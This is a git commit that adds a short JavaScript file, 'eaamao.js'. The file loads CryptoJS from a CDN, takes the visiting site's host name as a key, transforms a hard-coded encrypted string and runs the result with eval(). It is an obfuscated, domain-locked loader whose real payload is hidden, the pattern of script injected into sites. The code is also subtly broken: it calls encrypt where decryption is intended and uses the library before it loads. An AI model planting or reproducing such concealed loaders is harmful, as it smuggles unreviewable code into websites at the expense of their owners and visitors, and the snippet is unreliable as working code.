a279f2343ef602cc6993c8453787aee25802fcf8
suryandana <55724148+suryandana@users.noreply.github.com>
2023-04-14 12:18:42 +0700

    Create eaamao.js
    eaamao.js

---
+++ eaamao.js
@@ -0,0 +1,7 @@
+script=document.createElement('script');
+script.src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js";
+document.getElementsByTagName('head')[0].appendChild(script);
+key = window.location.host;
+encrypted = "U2FsdGVkX1+iaLwrl3/X3+kZxqrP7PmIYqmdf6Er+VYgvPWMJN1CrJmWKyELs2YE";
+decrypted = CryptoJS.AES.encrypt(encrypted, key);
+eval(decrypted.toString(CryptoJS.enc.Utf8));
